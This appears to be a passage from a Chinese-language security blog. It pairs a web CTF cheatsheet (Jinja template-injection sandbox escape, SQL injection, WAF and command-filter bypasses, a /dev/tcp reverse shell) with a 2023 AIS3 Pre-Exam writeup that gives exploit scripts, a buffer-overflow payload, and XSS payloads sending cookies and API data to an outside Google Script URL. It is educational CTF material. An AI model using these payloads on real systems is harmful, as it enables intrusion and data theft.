<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(template)</span><br><span class="line"><span class="comment">#可做一些簡單運算</span></span><br><span class="line">template=&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125; =&gt;<span class="number">49</span></span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">for</span> item <span class="keyword">in</span> item_list %&#125;</span><br><span class="line">	&#123;&#123; item &#125;&#125;&#123;% <span class="keyword">if</span> <span class="keyword">not</span> loop.last %&#125;,&#123;% endif %&#125;</span><br><span class="line">&#123;%-endfor-%&#125;</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">可以import os os.system()嗎? 不行，code是放在sandbox中跑的</span></span><br><span class="line"><span class="string">但可以用config.from_pyfile(filename)執行任意python檔案</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用_mro_(Method Resolution Order) <strong>bypass Python的Sandbox</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[].__class__ =&gt;&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"><span class="comment">#對object 查詢method</span></span><br><span class="line"></span><br><span class="line">[].__class__.__mro__ =&gt;(&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;,&lt;<span class="keyword">class</span> <span class="string">&#x27;object&gt;)</span></span><br><span class="line"><span class="string">#_mro_可查詢解析物件順序，此時可以發現所有物件的底層皆為object</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[].__class__.__base__ =&gt;&lt;class &#x27;</span><span class="built_in">object</span><span class="string">&#x27;&gt;</span></span><br><span class="line"><span class="string">#_base_可返回最底層的method,所以返回object</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[].__class_.__base_.__subclasses__()</span></span><br><span class="line"><span class="string">#_subclasses_直接返回所有subclasses，猛了object在最底層，所以所有物件都會return</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[].__class__.__base__.__subclasses__()[132] =&gt;&lt;class &#x27;</span>os._wrap_close<span class="string">&#x27;&gt;</span></span><br><span class="line"><span class="string">#os出現了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[].__class__.__base__.__subclasses__()[132].__init__.__globals__ =&gt;返回所有可被global調用的method</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;</span>system<span class="string">&#x27;](&#x27;</span>ls<span class="string">&#x27;)&#125;&#125;</span></span><br><span class="line"><span class="string">#os.system被A出來了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;</span>popen<span class="string">&#x27;](&#x27;</span>ls<span class="string">&#x27;).read()&#125;&#125;</span></span><br><span class="line"><span class="string">#回傳結果</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">SSTI Payload</a><br>更多奇技淫巧:<a target="_blank" rel="noopener" href="https://tw511.com/a/01/48066.html">https://tw511.com/a/01/48066.html</a></p>
<h2 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h2><p><a target="_blank" rel="noopener" href="https://www.796t.com/content/1545706659.html">https://www.796t.com/content/1545706659.html</a><br><a target="_blank" rel="noopener" href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/">https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</a></p>
<h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MySQL</span><br><span class="line">#comment</span><br><span class="line">-- comment     [Note the space after the double dash]</span><br><span class="line">/*comment*/</span><br><span class="line">/*! MYSQL Special SQL */</span><br><span class="line"></span><br><span class="line">PostgreSQL</span><br><span class="line">--comment</span><br><span class="line">/*comment*/</span><br><span class="line"></span><br><span class="line">MSQL</span><br><span class="line">--comment</span><br><span class="line">/*comment*/</span><br><span class="line"></span><br><span class="line">Oracle</span><br><span class="line">--comment</span><br><span class="line"></span><br><span class="line">SQLite</span><br><span class="line">--comment</span><br><span class="line">/*comment*/</span><br><span class="line"></span><br><span class="line">HQL</span><br><span class="line">HQL does not support Comments</span><br></pre></td></tr></table></figure>



<h3 id="常見waf"><a href="#常見waf" class="headerlink" title="常見waf"></a>常見waf</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">escape</span>()<span class="operator">-</span><span class="operator">&gt;</span>被轉成<span class="operator">%</span>XX，@<span class="operator">*</span> _ <span class="operator">+</span> <span class="operator">-</span> . <span class="operator">/</span>不編碼</span><br></pre></td></tr></table></figure>

<h3 id="waf繞過"><a href="#waf繞過" class="headerlink" title="waf繞過"></a>waf繞過</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x27;弄不出來的時候可以嘗試兩個urlencode合在一起</span><br><span class="line">%bf%27、%df%27、%aa%27</span><br></pre></td></tr></table></figure>

<h2 id="Reversed-Shell"><a href="#Reversed-Shell" class="headerlink" title="Reversed Shell"></a>Reversed Shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最經典</span><br><span class="line">nc -klvp [port] <span class="comment">#attacker&#x27;s host</span></span><br><span class="line">/bin/sh -i &gt;&amp; /dev/tcp/[host]/[port] 0&lt;&amp;1 <span class="comment">#victim</span></span><br></pre></td></tr></table></figure>

<p>問就是 <a target="_blank" rel="noopener" href="https://www.revshells.com/">revshells.com</a></p>
<h2 id="Commandline-Injection"><a href="#Commandline-Injection" class="headerlink" title="Commandline Injection"></a>Commandline Injection</h2><h3 id="截斷指令"><a href="#截斷指令" class="headerlink" title="截斷指令"></a>截斷指令</h3><p>最基本的截斷可用<code>;</code>達成，也可使用</p>
<ul>
<li><code>cmd1&amp;&amp;cmd2</code>當<code>cmd1</code> 執行成功時執行<code>cmd2</code></li>
<li><code>cmd1&amp;cmd2</code>簡單拼接，無論<code>cmd1</code>執行成功與否都會執行<code>cmd2</code></li>
<li><code>cmd1||cmd2</code>當<code>cmd1</code>執行失敗時執行&#96;cmd2</li>
<li><code>cmd1|cmd2</code>將<code>cmd1</code>的執行結果以pipeline塞給<code>cmd2</code></li>
<li>可以將指令包在 <code>\</code>`<code>或是</code>$()&#96; 之中</li>
</ul>
<h3 id="空格繞過"><a href="#空格繞過" class="headerlink" title="空格繞過"></a>空格繞過</h3><ul>
<li>使用<code>&lt;&gt;</code>繞過<ul>
<li><code>cat&lt;flag</code></li>
<li><code>cat&lt;&gt;flag</code></li>
</ul>
</li>
<li><code>&#123;cat,flag&#125;</code></li>
<li>使用特殊變量<code>$IFS</code>繞過(預設是空格)<ul>
<li><code>cat$IFS./flag</code></li>
<li><code>cat$IFS\flag</code></li>
</ul>
</li>
</ul>
<h3 id="過濾繞過"><a href="#過濾繞過" class="headerlink" title="過濾繞過"></a>過濾繞過</h3><ul>
<li>regex繞過<ul>
<li><code>/usr/bin/ca? flag</code></li>
</ul>
</li>
<li>反斜線繞過<ul>
<li><code>ca\t fl\ag</code></li>
</ul>
</li>
<li>空變量繞過<ul>
<li><code>ca$&#123;Z&#125;t flag</code></li>
</ul>
</li>
</ul>
<h3 id="一些猛料"><a href="#一些猛料" class="headerlink" title="一些猛料"></a>一些猛料</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/tardis/zm/art/339266206?source_id=1003">https://www.zhihu.com/tardis/zm/art/339266206?source_id=1003</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_61011147/article/details/126722464">https://blog.csdn.net/m0_61011147/article/details/126722464</a></p>
</blockquote>
<h2 id="一些會一直旺季的東東"><a href="#一些會一直旺季的東東" class="headerlink" title="一些會一直旺季的東東"></a>一些會一直旺季的東東</h2><p><img src="/2024/04/30/CTF-Cheatsheet-Web/3.png"></p>
<p><img src="/2024/04/30/CTF-Cheatsheet-Web/4.gif"></p>
<h2 id="更多筆記"><a href="#更多筆記" class="headerlink" title="更多筆記"></a>更多筆記</h2><p><a target="_blank" rel="noopener" href="https://github.com/splitline/How-to-Hack-Websites">https://github.com/splitline/How-to-Hack-Websites</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/splitline/My-CTF-Challenges/">https://github.com/splitline/My-CTF-Challenges/</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/%E8%B3%87%E5%AD%90%E4%B9%8B%E6%89%8B-%E5%AE%89%E4%B9%8B%E4%BD%A0%E6%88%91/%E8%B3%87%E5%AE%89%E6%96%B0%E6%89%8B%E5%85%A5%E9%96%80%E6%89%8B%E5%86%8A-web-security-%E9%A0%98%E8%88%AA%E4%B9%8B%E8%B7%AF-8d634d9228b5">[資安新手入門手冊] Web Security 領航之路</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/">简介 - CTF Wiki</a></p>
<p><a target="_blank" rel="noopener" href="https://edu-ctf.csie.org/"></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-02-07T07:24:52.000Z" title="2024/2/7 下午3:24:52">2024-02-07</time>發表</span><span class="level-item"><time dateTime="2024-11-17T04:45:19.226Z" title="2024/11/17 下午12:45:19">2024-11-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/">CTF</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/Writeup/">Writeup</a></span><span class="level-item">11 分鐘讀完 (大約1637個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/02/07/2023-AIS3-Pre-Exam-writeup/">2023 AIS3 Pre-Exam writeup</a></p><div class="content"><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><pre><code>Are you not a robot ?
FLAG Format: ^AIS3&#123;[A-Z0-9+-*/!?-]+&#125;$

Author: nella17
</code></pre>
<p>點開pdf，flag直接寫在上面了，一開始以為-是_結果浪費一堆時間</p>
<blockquote>
<p>AIS3{WELC0ME-T0-2023-PRE-EXAM-&amp;-MY-FIRST-CTF}</p>
</blockquote>
<h2 id="Robot"><a href="#Robot" class="headerlink" title="Robot"></a>Robot</h2><pre><code>Are you a robot?

Note: This is NOT a reversing or pwn challenge. Don&#39;t reverse the 
binary. It is for local testing only. You will actually get the flag 
after answering all the questions. You can practice locally by running 
./robot AIS3&#123;fake_flag&#125; 127.0.0.1 1234 and it will run the service on 
localhost:1234.

Author: toxicpie

nc chals1.ais3.org 12348
</code></pre>
<p>機器人會問你三十題數學，可以直接寫Python用eval()解<br>在discord看到有人說直接用手解，牛皮</p>
<h3 id="exploit-code"><a href="#exploit-code" class="headerlink" title="exploit code"></a>exploit code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">io=pwn.remote(<span class="string">&quot;chals1.ais3.org&quot;</span>,<span class="number">12348</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvuntil(<span class="string">&quot;!&quot;</span>))</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;solving..<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">    string=io.recv().decode()</span><br><span class="line">    string=string.strip(<span class="string">&quot; &quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(string,<span class="built_in">eval</span>(string))</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(string)))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rkpBv0QHh.png"></p>
<blockquote>
<p>AIS3{don’t_eval_unknown_code_or_pipe_curl_to_sh}<br>被罵了</p>
</blockquote>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Simply-Pwn"><a href="#Simply-Pwn" class="headerlink" title="Simply Pwn"></a>Simply Pwn</h2><pre><code>The simplest pwn

nc chals1.ais3.org 11111
</code></pre>
<p>經典buffer overflow</p>
<h3 id="先用gdb觀察"><a href="#先用gdb觀察" class="headerlink" title="先用gdb觀察"></a>先用gdb觀察</h3><p>ni到read附近</p>
<p><img src="https://hackmd.io/_uploads/H1wvwAmHh.png"></p>
<p>可以發現輸入變數存在<strong>rsi&#x3D;rbp-0x50+0x9&#x3D;rbp-0x47</strong></p>
<p>所以必須墊<strong>0x47+8byte(RSP)+address</strong>，剛好可以覆蓋return address</p>
<p><img src="https://hackmd.io/_uploads/ryndPC7S2.png"></p>
<p>直接讓程式跳到shellcode</p>
<h3 id="exploit-code-1"><a href="#exploit-code-1" class="headerlink" title="exploit code"></a>exploit code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line">io=pwn.remote(<span class="string">&quot;chals1.ais3.org&quot;</span>,<span class="number">11111</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x4f</span>)+pwn.p64(<span class="number">0x4017a5</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>AIS3{5imP1e_Pwn_4_beGinn3rs!}</p>
</blockquote>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Login-Panel"><a href="#Login-Panel" class="headerlink" title="Login Panel"></a>Login Panel</h2><pre><code>Login Panel 網站採用了隱形 reCAPTCHA 作為防護機制，以確保只有人類的使用者能夠登入
admin 的帳號。你的任務是找到一個方法來繞過 reCAPTCHA，成功登入 admin 的帳號。

你可以使用各種技術和手段來達成目標，可能需要進行一些網站分析、程式碼解讀或其他形式的
攻擊。請注意，你需要遵守道德規範，不得進行任何非法或有害的行為。

當你成功登入 admin 的帳號後，你將能夠獲得 FLAG。請將 FLAG 提交至挑戰平台，以證明
你的成功。

Author: Ching367436

http://chals1.ais3.org:8000/
</code></pre>
<p>直接讀source code</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="title function_">get</span>(<span class="string">`SELECT * FROM Users WHERE username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="subst">$&#123;password&#125;</span>&#x27;`</span></span><br></pre></td></tr></table></figure>

<p>聞起來就很有SQL injection的味道</p>
<h3 id="Bypass-Login-Page"><a href="#Bypass-Login-Page" class="headerlink" title="Bypass Login Page"></a>Bypass Login Page</h3><p>注入<strong>username</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure>
<p>中計直接被Redirect到rickroll</p>
<p><strong>ok不然改注password</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure>

<p>成功進入之後還有2fa認證，要輸入2fa code才能進到dashboard看flag，但是仔細看其實驗證完之後他也只是redirect到&#x2F;dashboard而已，所以直接存取&#x2F;dashboard即可</p>
<blockquote>
<p>AIS3{‘ UNION SELECT 1, 1, 1, 1 WHERE ({condition})–}</p>
</blockquote>
<h2 id="E-Portfolio-baby"><a href="#E-Portfolio-baby" class="headerlink" title="E-Portfolio baby"></a>E-Portfolio baby</h2><pre><code>AIS3 E-Portfolio 是一個學習成就展示平台，讓使用者可以建立並分享他們在 AIS3 的學習成果和專
案作品。其中，網站提供了一個「Share your portfolio with admin」的功能，讓使用者可以將自
己的作品集分享給管理員。

你需要找出一個前端漏洞，當你分享作品集給管理員時，能夠竊取 admin 的旗幟。你可以透過探索網站
的前端程式碼，找到適當的方式來觸發漏洞並取得旗幟。

請注意，你需要在漏洞設計中保持合法並遵循道德原則。請勿以任何方式傷害網站的正常運作或使用者的隱私。

對了，按下「Share your portfolio with admin」的按鈕的時候，admin 會去拜訪的頁面會是
http://url/share?username=&#123;按下那個按鈕的使用者名稱&#125;。

Author: Ching367436

http://chals1.ais3.org:8880/
</code></pre>
<p>看到share to admin就知道這是csrf題目<br>先戳戳看</p>
<h3 id="測試XSS"><a href="#測試XSS" class="headerlink" title="測試XSS"></a>測試XSS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>沒反應，因為寫上文字是使用innerHTML，所以對 <strong>&lt;script&gt;</strong> 標籤不起作用</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (data.<span class="property">success</span>) &#123;</span><br><span class="line">                        username.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">username</span></span><br><span class="line">                        about.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">about</span></span><br><span class="line">                        avatar.<span class="property">src</span> = data.<span class="property">data</span>.<span class="property">avatar</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="title function_">alert</span>(data.<span class="property">message</span>)</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
<p>用 <strong>&lt;img src&gt;</strong> 試試</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;123&quot; onerror=alert()&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rkAxgsVH2.png"><br>果然出現XSS</p>
<h3 id="嘗試當cookie小偷"><a href="#嘗試當cookie小偷" class="headerlink" title="嘗試當cookie小偷"></a>嘗試當cookie小偷</h3><p><strong>一開始的思路是當cookie小偷，然後用admin登入看flag藏在哪</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&#x27;&#x27; onerror=fetch(&#x27;https://script.google.com/macros/s/\</span><br><span class="line">                           AKfycbxFRZIq7zd9X5gpd9MNCIe9m6d_GwrT3kY9vkVH8hPXic7pbr-\</span><br><span class="line">                           pW0B8vTj0lureCaOdOA/exec?\</span><br><span class="line">                           text=cookie:&#x27;+encodeURI(document.cookie))&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/B1syQsNBn.png"><br>因為有設定HTTP only所以偷不到cookie(後來發現偷到也沒用，flag不在admin的頁面裡面)</p>
<h3 id="嘗試直接偷api內容"><a href="#嘗試直接偷api內容" class="headerlink" title="嘗試直接偷api內容"></a>嘗試直接偷api內容</h3><p>看sauce code會發現其實flag寫在admin的密碼裡面，然後密碼又透過api&#x2F;portfolio傳遞<br><img src="https://hackmd.io/_uploads/ByImUsEB3.png"></p>
<p>ok開偷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;123&quot; onerror=&quot;fetch(&#x27;api/portfolio&#x27;)</span><br><span class="line">      .then(response =&gt;response.text()).then(text=&gt;&#123;</span><br><span class="line">        var url=</span><br><span class="line">            &#x27;https://script.google.com/macros/s/\</span><br><span class="line">            AKfycbxFRZIq7zd9X5gpd9MNCIe9m6d_GwrT3kY9vkVH8hPXic7pbr-\</span><br><span class="line">            pW0B8vTj0lureCaOdOA/exec?text=&#x27;</span><br><span class="line">        fetch(url+encodeURI(text))</span><br><span class="line">      &#125;)&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/S19GtoVrh.png"><br>在瀏覽器上測試成功，但share to admin甚麼事都沒發生</p>
<p><img src="https://hackmd.io/_uploads/HkNT5jNrh.png"><br>網站沒有設定CSP，所以應該是機器人沒辦法訪問外網</p>
<h3 id="嘗試寫入自己的page"><a href="#嘗試寫入自己的page" class="headerlink" title="嘗試寫入自己的page"></a>嘗試寫入自己的page</h3><p>沒辦法直接用webhook就變很複雜了</p>
<p><strong>改變絲路:</strong><br>偷到api&#x2F;portfolio-&gt;登入自己的帳號-&gt;寫入textarea-&gt;儲存</p>
<p><em><strong>創建登入form</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=form action=&quot;/api/login&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;username&quot; value=&quot;test123&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;password&quot; value=&quot;test&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p><em><strong>先偷api&#x2F;portfolio再submit表單切成自己帳號，最後改textarea、click save</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;123&quot; onerror=&quot;fetch(&#x27;http://web:8000/api/portfolio&#x27;)</span><br><span class="line">      .then(response =&gt;response.text()).then(text=&gt;&#123;</span><br><span class="line">        form.submit()</span><br><span class="line">        setTimeout(function() &#123;</span><br><span class="line">        console.log(&#x27;123&#x27;);</span><br><span class="line">        &#125;, 1000);    </span><br><span class="line">        var win=window.open(&#x27;http://web:8000/portfolio&#x27;)</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">        win.document.querySelector(&#x27;textarea[id=about]&#x27;).value = text;</span><br><span class="line">        win.document.querySelector(&#x27;button[id=save]&#x27;).click()</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">      &#125;)&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/HJDHTiNSn.png"></p>
<blockquote>
<p>AIS3{&lt;img src&#x3D;x onerror&#x3D;’fetch(…}</p>
</blockquote>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Simply-Reverse"><a href="#Simply-Reverse" class="headerlink" title="Simply Reverse"></a>Simply Reverse</h2><pre><code>Just reverse it!
</code></pre>
<h3 id="先執行看看"><a href="#先執行看看" class="headerlink" title="先執行看看"></a>先執行看看</h3><p><img src="https://hackmd.io/_uploads/B10RnhEr2.png"></p>
<p><img src="https://hackmd.io/_uploads/S1kMT2NSh.png"></p>
<h3 id="丟ghidra"><a href="#丟ghidra" class="headerlink" title="丟ghidra"></a>丟ghidra</h3><p><img src="https://hackmd.io/_uploads/ryusahEB3.png"><br>這邊有一個verify函式判斷key是否正確</p>
<h3 id="解題絲路"><a href="#解題絲路" class="headerlink" title="解題絲路"></a>解題絲路</h3><pre><code>因為verify()的迴圈每跑一圈就會檢查一個char，一直到local_c=0x22 然後return true;
所以可以brute force 跑每個字元然後看迴圈有沒有炸掉
</code></pre>
<h3 id="exploit-code-2"><a href="#exploit-code-2" class="headerlink" title="exploit code"></a>exploit code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">io=pwn.process(<span class="string">&quot;gdb&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;file rev&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;b *0x5555555551fb&quot;</span>)    <span class="comment">#把breakpoint 設在迴圈裏面，如果沒有停代表是錯的</span></span><br><span class="line">io.recvrepeat(timeout=<span class="number">1</span>)</span><br><span class="line">flag=<span class="string">&quot;AIS3&#123;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7E</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;trying..&quot;</span>,flag+<span class="built_in">chr</span>(i))</span><br><span class="line">        io.sendline(<span class="string">f&quot;set args <span class="subst">&#123;flag+<span class="built_in">chr</span>(i)&#125;</span>&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;run&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)+<span class="number">1</span>):</span><br><span class="line">            io.sendline(<span class="string">&quot;c&quot;</span>)</span><br><span class="line">        io.recvrepeat(timeout=<span class="number">0.3</span>).decode()</span><br><span class="line">        io.sendline(<span class="string">&quot;x/x $rbp-0x4&quot;</span>)</span><br><span class="line">        string=io.recv().decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;No&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> string:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<blockquote>
<p>AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}</p>
</blockquote>
